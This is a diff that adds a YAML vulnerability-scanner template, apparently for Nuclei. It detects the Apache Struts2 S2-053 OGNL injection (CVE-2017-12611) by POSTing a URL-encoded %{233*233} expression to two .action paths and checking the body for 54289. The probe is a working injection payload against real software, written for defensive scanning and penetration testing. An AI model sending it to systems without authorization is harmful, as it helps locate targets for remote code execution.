@@ -1,0 +1,33 @@
+id: local-struts2-s2-053-math
+
+info:
+  name: Struts2 S2-053 Freemarker OGNL Injection (CVE-2017-12611)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-053 (CVE-2017-12611) OGNL injection via Freemarker templates.
+    Safe math probe: %{233*233} evaluates to 54289 in response body.
+    Note: payload must end with a newline character.
+  reference:
+    - https://struts.apache.org/docs/s2-053.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2017-12611
+  tags: safe-poc,struts2,s2-053,cve,cve2017,ognl,freemarker,rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/hello.action"
+      - "{{BaseURL}}/index.action"
+    body: "redirectUri=%25%7B233*233%7D%0A"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "54289"
+      - type: status
+        status:
+          - 200
